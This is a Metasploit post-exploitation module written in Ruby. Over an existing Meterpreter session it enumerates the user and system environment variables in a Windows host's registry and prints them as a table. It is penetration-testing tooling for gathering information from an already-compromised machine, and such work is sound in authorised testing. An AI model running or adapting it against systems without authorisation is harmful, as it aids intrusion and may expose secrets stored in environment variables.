##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Manage System Variables',
      'Description'   => %q{
          This module will extract a list of all System and User environment variables.},
      'License'       => MSF_LICENSE,
      'Author'        => ['ByteZealot'],
      'Platform'      => ['win']
    ))

    register_options(
      [
        OptString.new('ACTION', [true, 'The action to take: variables or help', 'variables'])
      ], self.class)
  end


  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    action = datastore['ACTION']

    if not action
      print_error("Invalid action")
      return
    end

    case action
    when /^variables$/i
      variables
    when /^help$/i
      help
    end
  end


  def variables
    var_names = []
    var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
    var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
    var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")

    print_status("Getting all System and User Variables")
    tbl = Rex::Text::Table.new(
      'Header'  => "Enviroment Variable list",
      'Indent'  => 1,
      'Columns' =>
        [
          "Name",
          "Value"
        ])
    client.sys.config.getenvs(*var_names.flatten).each do |k, v|
      tbl << [k, v]
    end
    print("\n" + tbl.to_s + "\n")
  end


  def help
    print_line "Meterpreter Script for extracting a list of all System and User environment variables."
  end

end

